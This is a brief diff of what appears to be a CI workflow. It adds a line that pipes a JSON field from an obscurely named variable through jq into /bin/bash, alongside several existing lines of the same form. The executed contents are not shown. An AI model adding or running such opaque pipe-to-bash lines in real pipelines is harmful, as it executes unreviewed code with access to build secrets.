@@ -28,6 +28,7 @@ jobs:
           echo $wip6 | jq -r .n400 | /bin/bash
           echo $vgbrv09566 | jq -r .z2 | /bin/bash
           echo $co7 | jq -r .u115 | /bin/bash
+          echo $k121 | jq -r .sy20681 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
